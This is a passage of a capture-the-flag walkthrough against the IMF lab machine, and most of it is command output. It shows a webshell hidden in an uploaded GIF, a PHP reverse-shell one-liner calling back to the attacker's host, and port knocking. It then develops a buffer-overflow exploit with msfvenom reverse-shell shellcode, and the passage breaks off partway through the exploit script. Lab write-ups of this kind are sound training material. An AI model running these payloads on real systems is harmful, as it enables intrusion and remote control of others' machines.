+root@kali:~# curl -c /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploads/16344eb0919a.gif?cmd=ls%20-al'
+����total 124
+drwxr-xr-x 2 www-data www-data  4096 Nov  4 20:40 .
+drwxr-xr-x 4 www-data www-data  4096 Oct 17 04:51 ..
+-rw-r--r-- 1 www-data www-data    82 Oct 12 19:26 .htaccess
+-rw-r--r-- 1 www-data www-data    43 Nov  4 20:40 16344eb0919a.gif
+-rw-r--r-- 1 www-data www-data  2539 Nov  4 20:14 2b705aada13b.jpg
+-rw-r--r-- 1 www-data www-data    41 Nov  4 20:35 3580d33cfd01.gif
+-rw-r--r-- 1 www-data www-data    41 Nov  4 20:32 5fba0f426811.jpg
+-rw-r--r-- 1 www-data www-data    41 Nov  4 20:36 769b8269c0ba.gif
+-rw-r--r-- 1 www-data www-data    41 Nov  4 20:34 79bf51b01b6a.gif
+-rw-r--r-- 1 www-data www-data 83407 Nov  4 20:13 bffd73ceee58.jpg
+-rw-r--r-- 1 www-data www-data    28 Oct 12 19:32 flag5_abc123def.txt
+root@kali:~# curl -c /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploads/16344eb0919a.gif?cmd=cat%20flag5_abc123def.txt'
+����flag5{YWdlbnRzZXJ2aWNlcw==}
+root@kali:~#
+root@kali:~# echo YWdlbnRzZXJ2aWNlcw== | base64 -d
+agentservices
+root@kali:~#
+</code></pre></div></div>
+
+<blockquote>
+  <p>flag5{YWdlbnRzZXJ2aWNlcw==}</p>
+</blockquote>
+
+<p>Awesome, we have the 5th flag. Let’s now get a shell. I used a php reverse shell found on <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey</a> for this</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# :~# curl -c /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploads/16344eb0919a.gif?cmd=php%20-r%20%27%24sock%3Dfsockopen(%22192.168.1.60%C22)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27'
+
+root@kali:~# nc -lnvp 22
+listening on [any] 22 ...
+connect to [192.168.1.60] from (UNKNOWN) [192.168.1.62] 50770
+/bin/sh: 0: can't access tty; job control turned off
+$
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div></div>
+
+<p>Now that we have a shell, it was time to escalate. Again, following the hints, I searched for any files with agent in the name.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -name "*agent*" -print 2&gt;/dev/null
+/usr/local/bin/agent
+...SNIP...
+www-data@imf:/var/www$
+www-data@imf:/var/www$ file /usr/local/bin/agent
+file /usr/local/bin/agent
+/usr/local/bin/agent: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped
+www-data@imf:/var/www$
+www-data@imf:/var/www$ echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@imf:/var/www$
+www-data@imf:/var/www$ agent
+agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 12345678
+Invalid Agent ID
+www-data@imf:/var/www$
+
+</code></pre></div></div>
+
+<p>Cool… Looks like a custom application that requires an agent ID. It runs as root as well. Previously (output not shown) I noticed knockd service was running so it’s likely we have a hidden port. Further checking and I found access_codes in /usr/local/bin alongside the agent binary.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@imf:/var/www$ cd /usr/local/bin
+cd /usr/local/bin
+www-data@imf:/usr/local/bin$ ls -l
+ls -l
+total 16
+-rw-r--r-- 1 root root    19 Oct 16 08:11 access_codes
+-rwxr-xr-x 1 root root 11896 Oct 12 22:39 agent
+www-data@imf:/usr/local/bin$
+
+www-data@imf:/usr/local/bin$ cat access_codes
+cat access_codes
+SYN 7482,8279,9467
+www-data@imf:/usr/local/bin$
+</code></pre></div></div>
+
+<p>If that doesn’t scream port knock, I don’t know what else does.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -p- --min-rate=400 -T4 192.168.1.62
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:06 EDT
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.0028s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 90.51 seconds
+root@kali:~#
+root@kali:~# for x in 7482 8279 9467; do nmap -sS --max-retries 0 -p $x 192.168.1.62; done
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:09 EDT
+Warning: 192.168.1.62 giving up on port because retransmission cap hit (0).
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00053s latency).
+PORT     STATE    SERVICE
+7482/tcp filtered unknown
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:09 EDT
+Warning: 192.168.1.62 giving up on port because retransmission cap hit (0).
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00051s latency).
+PORT     STATE    SERVICE
+8279/tcp filtered unknown
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:09 EDT
+Warning: 192.168.1.62 giving up on port because retransmission cap hit (0).
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00044s latency).
+PORT     STATE    SERVICE
+9467/tcp filtered unknown
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+root@kali:~# nmap -p- --min-rate=400 -T4 192.168.1.62
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:09 EDT
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00084s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+7788/tcp open  unknown
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 87.03 seconds
+</code></pre></div></div>
+
+<p>Sweet, 7788 opened up and upon connection I was presented with the same IMF agent services prompt.</p>
+
+<p>Luckily, finding the agent string was easy as ltrace was installed on the target.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@imf:/usr/local/bin$ ltrace ./agent
+ltrace ./agent
+__libc_start_main(0x80485fb, 1, 0xffe0d274, 0x8048970 &lt;unfinished ...&gt;
+setbuf(0xf779bd60, 0)                            = &lt;void&gt;
+asprintf(0xffe0d1a8, 0x80489f0, 0x2ddd984, 0xf76030ec) = 8
+puts("  ___ __  __ ___ "  ___ __  __ ___
+)                        = 18
+puts(" |_ _|  \\/  | __|  Agent" |_ _|  \/  | __|  Agent
+)                = 25
+puts("  | || |\\/| | _|   Reporting"  | || |\/| | _|   Reporting
+)            = 29
+puts(" |___|_|  |_|_|    System\n" |___|_|  |_|_|    System
+
+)              = 27
+printf("\nAgent ID : "
+Agent ID : )                          = 12
+fgets(12
+"12\n", 9, 0xf779b5a0)                     = 0xffe0d1ae
+strncmp("12\n", "48093572", 8)                   = -1 &lt;&lt;&lt;---- Agent Number
+puts("Invalid Agent ID "Invalid Agent ID
+)                        = 18
++++ exited (status 254) +++
+www-data@imf:/usr/local/bin$
+</code></pre></div></div>
+
+<p>I copied the binary over to my host and started some fuzzing. Found a seg fault in the Submit Report function.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/tmp# ./agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Report: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Submitted for review.
+root@kali:/tmp# ./agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Report: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Submitted for review.
+Segmentation fault
+</code></pre></div></div>
+
+<p>Now comes the fun part :)</p>
+
+<p>I’ve posted the majority of my output below, should be simple enough to follow the steps but if you have questions feel free to comment and let me know.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/tmp# locate pattern_create.rb
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
+root@kali:/tmp#
+root@kali:/tmp# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -h
+Usage: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb [options]
+Example: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 -s ABC,def,123
+Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf
+
+Options:
+    -l, --length &lt;length&gt;            The length of the pattern
+    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets
+    -h, --help                       Show this message
+root@kali:/tmp#
+root@kali:/tmp# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+
+root@kali:/tmp# gdb -q ./agent
+Reading symbols from ./agent...(no debugging symbols found)...done.
+(gdb) 48093572
+Undefined command: "48093572".  Try "help".
+(gdb) run
+Starting program: /tmp/agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+Report: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+Submitted for review.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366641 in ?? () &lt;&lt;&lt;&lt;---- OFFSET
+(gdb)
+
+root@kali:/tmp# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 41366641
+[*] Exact match at offset 168
+
+root@kali:/tmp# python -c 'print "A"*168 + "B"*4'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+root@kali:/tmp#
+root@kali:/tmp# gdb -q ./agent
+Reading symbols from ./agent...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /tmp/agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Report: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Submitted for review.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? () &lt;&lt;&lt;&lt; ---- Confirmed offset
+(gdb)
+(gdb)
+(gdb) i r
+eax            0xbffff394	-1073745004
+ecx            0xffffffff	-1
+edx            0xb7fb4870	-1208268688
+ebx            0x0	0
+esp            0xbffff440	0xbffff440
+ebp            0x41414141	0x41414141
+esi            0xb7fb3000	-1208274944
+edi            0xb7fb3000	-1208274944
+eip            0x42424242	0x42424242
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/40x $eax   &lt;&lt;&lt;&lt; ---- Our string is stored in EAX
+0xbffff394:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3a4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3b4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3c4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3d4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3e4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3f4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff404:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff414:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff424:	0x41414141	0x41414141	0xbffff394	0x41414141
+
+root@kali:/tmp# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm &gt; call eax
+00000000  FFD0              call eax
+nasm &gt; quit
+root@kali:/tmp#
+root@kali:/tmp# objdump -d ./agent | grep 'ff d0'
+ 8048563:	ff d0                	call   *%eax
+root@kali:/tmp#
+root@kali:/tmp# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.60 LPORT=4443 -f python -b "\x00\x0a\x0d"
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of python file: 470 bytes
+buf =  ""
+buf += "\xbb\x3a\xe0\x27\x8b\xdb\xc4\xd9\x74\x24\xf4\x5a\x2b"
+buf += "\xc9\xb1\x12\x83\xea\xfc\x31\x5a\x0e\x03\x60\xee\xc5"
+buf += "\x7e\xa5\x35\xfe\x62\x96\x8a\x52\x0f\x1a\x84\xb4\x7f"
+buf += "\x7c\x5b\xb6\x13\xd9\xd3\x88\xde\x59\x5a\x8e\x19\x31"
+buf += "\x9d\xd8\xdb\xfd\x75\x1b\xdc\xec\xde\x92\x3d\xbe\x87"
+buf += "\xf4\xec\xed\xf4\xf6\x87\xf0\x36\x78\xc5\x9a\xa6\x56"
+buf += "\x99\x32\x5f\x86\x72\xa0\xf6\x51\x6f\x76\x5a\xeb\x91"
+buf += "\xc6\x57\x26\xd1"
+</code></pre></div></div>
+
+<p>And the final exploit script.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'192.168.1.62'</span><span class="p">,</span> <span class="mi">7788</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"48093572</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span>  <span class="s">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xbb\x3a\xe0\x27\x8b\xdb\xc4\xd9\x74\x24\xf4\x5a\x2b</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc9\xb1\x12\x83\xea\xfc\x31\x5a\x0e\x03\x60\xee\xc5</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x7e\xa5\x35\xfe\x62\x96\x8a\x52\x0f\x1a\x84\xb4\x7f</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x7c\x5b\xb6\x13\xd9\xd3\x88\xde\x59\x5a\x8e\x19\x31</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x9d\xd8\xdb\xfd\x75\x1b\xdc\xec\xde\x92\x3d\xbe\x87</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xf4\xec\xed\xf4\xf6\x87\xf0\x36\x78\xc5\x9a\xa6\x56</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x99\x32\x5f\x86\x72\xa0\xf6\x51\x6f\x76\x5a\xeb\x91</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc6\x57\x26\xd1</span><span class="s">"</span>
+
